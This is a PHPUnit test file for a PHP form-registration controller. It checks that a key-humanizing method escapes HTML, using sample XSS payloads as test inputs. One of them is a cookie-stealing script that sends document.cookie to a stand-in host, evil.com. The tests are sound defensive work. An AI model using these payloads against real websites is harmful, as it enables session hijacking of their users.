<?php
declare(strict_types=1);

namespace Tests\Unit\Controllers;

use App\Controllers\DetailController;
use App\Repositories\AnmeldungRepository;
use App\Models\Anmeldung;
use PHPUnit\Framework\TestCase;
use ReflectionClass;

/**
 * Tests for DetailController - especially XSS prevention in humanizeKey()
 */
class DetailControllerTest extends TestCase
{
    private AnmeldungRepository $mockRepository;
    private DetailController $controller;

    protected function setUp(): void
    {
        parent::setUp();

        $this->mockRepository = $this->createMock(AnmeldungRepository::class);
        $this->controller = new DetailController($this->mockRepository);
    }

    /**
     * Helper to call private humanizeKey() method via reflection
     */
    private function callHumanizeKey(string $key): string
    {
        $reflection = new ReflectionClass($this->controller);
        $method = $reflection->getMethod('humanizeKey');
        $method->setAccessible(true);

        return $method->invoke($this->controller, $key);
    }

    /**
     * Test that normal keys are humanized correctly
     */
    public function testHumanizeKeyWithNormalInput(): void
    {
        $this->assertEquals('First Name', $this->callHumanizeKey('first_name'));
        $this->assertEquals('Last Name', $this->callHumanizeKey('lastName'));
        $this->assertEquals('Email Address', $this->callHumanizeKey('email_address'));
    }

    /**
     * Test that snake_case is converted to spaces
     */
    public function testHumanizeKeyConvertsSnakeCase(): void
    {
        $this->assertEquals('User Name', $this->callHumanizeKey('user_name'));
        $this->assertEquals('Date Of Birth', $this->callHumanizeKey('date_of_birth'));
    }

    /**
     * Test that camelCase is converted to spaces
     */
    public function testHumanizeKeyConvertsCamelCase(): void
    {
        $this->assertEquals('First Name', $this->callHumanizeKey('firstName'));
        $this->assertEquals('Last Name', $this->callHumanizeKey('lastName'));
        $this->assertEquals('Email Address', $this->callHumanizeKey('emailAddress'));
    }

    /**
     * Test that first letter of each word is capitalized
     */
    public function testHumanizeKeyCapitalizesWords(): void
    {
        $this->assertEquals('Name', $this->callHumanizeKey('name'));
        $this->assertEquals('Full Name', $this->callHumanizeKey('full_name'));
    }

    /**
     * Test XSS: Script tags are escaped
     */
    public function testHumanizeKeyEscapesScriptTags(): void
    {
        $malicious = '<script>alert("XSS")</script>';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain unescaped script tags
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('</script>', $result);

        // Should contain escaped version
        $this->assertStringContainsString('&lt;script&gt;', $result);
        $this->assertStringContainsString('&lt;/script&gt;', $result);
    }

    /**
     * Test XSS: HTML tags are escaped
     */
    public function testHumanizeKeyEscapesHtmlTags(): void
    {
        $malicious = '<img src=x onerror="alert(1)">';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain unescaped tags
        $this->assertStringNotContainsString('<img', $result);
        $this->assertStringNotContainsString('onerror=', $result);

        // Should contain escaped version
        $this->assertStringContainsString('&lt;img', $result);
    }

    /**
     * Test XSS: Event handlers are escaped
     */
    public function testHumanizeKeyEscapesEventHandlers(): void
    {
        $malicious = 'onclick="alert(1)"';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain unescaped quotes
        $this->assertStringNotContainsString('onclick="', $result);

        // Should contain escaped quotes
        $this->assertStringContainsString('&quot;', $result);
    }

    /**
     * Test XSS: Single quotes are escaped (ENT_QUOTES)
     */
    public function testHumanizeKeyEscapesSingleQuotes(): void
    {
        $malicious = "test'onclick='alert(1)'";
        $result = $this->callHumanizeKey($malicious);

        // Single quotes should be escaped
        $this->assertStringContainsString('&#039;', $result);
        $this->assertStringNotContainsString("'onclick=", $result);
    }

    /**
     * Test XSS: Double quotes are escaped (ENT_QUOTES)
     */
    public function testHumanizeKeyEscapesDoubleQuotes(): void
    {
        $malicious = 'test"onclick="alert(1)"';
        $result = $this->callHumanizeKey($malicious);

        // Double quotes should be escaped
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringNotContainsString('"onclick="', $result);
    }

    /**
     * Test XSS: Complex attack vector
     */
    public function testHumanizeKeyEscapesComplexXssVector(): void
    {
        $malicious = '"><script>document.location="http://evil.com?cookie="+document.cookie</script>';
        $result = $this->callHumanizeKey($malicious);

        // Should NOT contain any unescaped script tags (most important)
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('</script>', $result);

        // All special characters should be escaped
        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringContainsString('&lt;script&gt;', $result);
        $this->assertStringContainsString('&lt;/script&gt;', $result);

        // Note: "document." itself is not dangerous when script tags are escaped
        // The XSS is prevented by escaping the HTML structure, not the JS code inside
    }

    /**
     * Test XSS: UTF-8 encoding is preserved
     *
     * Note: ucwords() doesn't capitalize non-ASCII characters like 'ü'
     * This is a known PHP limitation. For full UTF-8 support, mb_convert_case() would be needed.
     * However, for security purposes, the important thing is that UTF-8 characters are not corrupted.
     */
    public function testHumanizeKeyPreservesUtf8(): void
    {
        // German umlauts should not be corrupted (even if not capitalized)
        $result = $this->callHumanizeKey('über_name');
        $this->assertStringContainsString('über', $result); // ucwords() doesn't capitalize ü

        // Emoji should work
        $result = $this->callHumanizeKey('name_😀');
        $this->assertStringContainsString('😀', $result);
    }

    /**
     * Test XSS: NULL bytes are handled
     */
    public function testHumanizeKeyHandlesNullBytes(): void
    {
        $malicious = "test\0injection";
        $result = $this->callHumanizeKey($malicious);

        // NULL byte should not break escaping
        $this->assertIsString($result);
    }

    /**
     * Test that show() throws exception for invalid ID
     */
    public function testShowThrowsExceptionForInvalidId(): void
    {
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Ungültige ID');

        $this->controller->show(0);
    }

    /**
     * Test that show() throws exception when entry not found
     */
    public function testShowThrowsExceptionWhenNotFound(): void
    {
        $this->mockRepository
            ->expects($this->once())
            ->method('findById')
            ->with(999)
            ->willReturn(null);

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Eintrag nicht gefunden');

        $this->controller->show(999);
    }

    /**
     * Test that show() returns correct structure
     */
    public function testShowReturnsCorrectStructure(): void
    {
        $mockAnmeldung = new Anmeldung(
            id: 1,
            formular: 'bs',
            formularVersion: null,
            name: 'Test User',
            email: 'test@example.com',
            status: 'neu',
            data: ['field1' => 'value1'],
            createdAt: new \DateTimeImmutable(),
            updatedAt: null,
            deleted: false,
            deletedAt: null
        );

        $this->mockRepository
            ->expects($this->once())
            ->method('findById')
            ->with(1)
            ->willReturn($mockAnmeldung);

        $result = $this->controller->show(1);

        $this->assertArrayHasKey('anmeldung', $result);
        $this->assertArrayHasKey('structuredData', $result);
        $this->assertArrayHasKey('uploadedFiles', $result);

        $this->assertSame($mockAnmeldung, $result['anmeldung']);
        $this->assertIsArray($result['structuredData']);
        $this->assertIsArray($result['uploadedFiles']);
    }

    /**
     * Test that structured data with XSS in field names is sanitized
     */
    public function testStructuredDataSanitizesFieldNames(): void
    {
        $mockAnmeldung = new Anmeldung(
            id: 1,
            formular: 'bs',
            formularVersion: null,
            name: 'Test User',
            email: 'test@example.com',
            status: 'neu',
            data: [
                '<script>alert("XSS")</script>' => 'malicious_key',
                'normal_field' => 'safe_value',
            ],
            createdAt: new \DateTimeImmutable(),
            updatedAt: null,
            deleted: false,
            deletedAt: null
        );

        $this->mockRepository
            ->expects($this->once())
            ->method('findById')
            ->with(1)
            ->willReturn($mockAnmeldung);

        $result = $this->controller->show(1);

        // Check that malicious key was sanitized in label
        $structuredData = $result['structuredData'];
        $this->assertCount(2, $structuredData);

        // Find the field with malicious key
        $maliciousField = null;
        foreach ($structuredData as $field) {
            if ($field['key'] === '<script>alert("XSS")</script>') {
                $maliciousField = $field;
                break;
            }
        }

        $this->assertNotNull($maliciousField);

        // Label should be escaped
        $this->assertStringNotContainsString('<script>', $maliciousField['label']);
        $this->assertStringContainsString('&lt;script&gt;', $maliciousField['label']);
    }
}
